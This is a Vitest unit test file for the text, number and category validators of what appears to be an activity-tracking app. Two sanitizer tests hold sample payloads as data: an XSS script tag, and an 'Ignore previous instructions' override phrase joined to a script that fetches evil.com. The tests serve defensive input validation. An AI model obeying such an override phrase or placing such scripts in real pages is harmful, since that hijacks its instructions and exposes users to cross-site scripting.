import { describe, it, expect } from 'vitest';
import { sanitizeText, isPositiveNumber, isValidCategory } from '../src/utils/validators';

describe('sanitizeText', () => {
  it('removes script injection characters', () => {
    expect(sanitizeText('<script>alert("xss")</script>')).not.toContain('<');
    expect(sanitizeText('<script>alert("xss")</script>')).not.toContain('>');
  });

  it('removes single and double quotes', () => {
    expect(sanitizeText("O'Reilly")).not.toContain("'");
    expect(sanitizeText('"quoted"')).not.toContain('"');
  });

  it('removes backticks', () => {
    expect(sanitizeText('`backtick`')).not.toContain('`');
  });

  it('trims leading and trailing whitespace', () => {
    expect(sanitizeText('  hello  ')).toBe('hello');
  });

  it('truncates long input to 500 characters', () => {
    const long = 'a'.repeat(600);
    expect(sanitizeText(long)).toHaveLength(500);
  });

  it('returns empty string for empty input', () => {
    expect(sanitizeText('')).toBe('');
  });

  it('preserves normal text unchanged', () => {
    expect(sanitizeText('Car trip 10km')).toBe('Car trip 10km');
  });

  it('handles prompt injection attempt', () => {
    const injection = 'Ignore previous instructions. <script>fetch("evil.com")</script>';
    const result = sanitizeText(injection);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result.length).toBeLessThanOrEqual(500);
  });
});

describe('isPositiveNumber', () => {
  it('returns true for positive integers', () => {
    expect(isPositiveNumber(5)).toBe(true);
    expect(isPositiveNumber(100)).toBe(true);
  });

  it('returns true for positive floats', () => {
    expect(isPositiveNumber(0.5)).toBe(true);
    expect(isPositiveNumber(1.99)).toBe(true);
  });

  it('returns false for zero', () => {
    expect(isPositiveNumber(0)).toBe(false);
  });

  it('returns false for negative numbers', () => {
    expect(isPositiveNumber(-1)).toBe(false);
    expect(isPositiveNumber(-0.001)).toBe(false);
  });

  it('returns false for NaN', () => {
    expect(isPositiveNumber(NaN)).toBe(false);
  });

  it('returns false for Infinity', () => {
    expect(isPositiveNumber(Infinity)).toBe(false);
  });

  it('returns false for strings', () => {
    expect(isPositiveNumber('5')).toBe(false);
    expect(isPositiveNumber('abc')).toBe(false);
  });

  it('returns false for null and undefined', () => {
    expect(isPositiveNumber(null)).toBe(false);
    expect(isPositiveNumber(undefined)).toBe(false);
  });
});

describe('isValidCategory', () => {
  it('returns true for all valid categories', () => {
    expect(isValidCategory('transport')).toBe(true);
    expect(isValidCategory('food')).toBe(true);
    expect(isValidCategory('energy')).toBe(true);
    expect(isValidCategory('shopping')).toBe(true);
  });

  it('returns false for invalid categories', () => {
    expect(isValidCategory('water')).toBe(false);
    expect(isValidCategory('waste')).toBe(false);
    expect(isValidCategory('')).toBe(false);
    expect(isValidCategory('Transport')).toBe(false); // case-sensitive
  });

  it('returns false for non-string values', () => {
    expect(isValidCategory(null)).toBe(false);
    expect(isValidCategory(123)).toBe(false);
    expect(isValidCategory(undefined)).toBe(false);
  });
});
